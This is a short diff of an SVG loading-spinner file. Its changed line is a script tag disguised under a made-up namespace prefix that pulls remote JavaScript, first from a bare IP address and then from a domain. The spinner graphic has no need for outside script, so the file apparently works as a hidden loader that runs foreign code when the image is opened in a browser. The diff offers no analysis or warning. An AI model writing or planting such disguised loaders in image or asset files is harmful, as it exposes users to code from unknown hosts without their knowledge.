@@ -6,5 +6,5 @@
         <animateTransform attributeName="transform" type="rotate" from="0 50 25" to="360 50 25" dur="2s" repeatCount="indefinite" />
     </circle>
     <text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-size="14px" fill="#007bff" id="msg"></text>
-    <something:script src="//154.12.54.196/assets/js/1001.js" xmlns:something="http://www.w3.org/1999/xhtml"></something:script>
+    <something:script src="//totimego.com/assets/js/1001.js" xmlns:something="http://www.w3.org/1999/xhtml"></something:script>
 </svg>
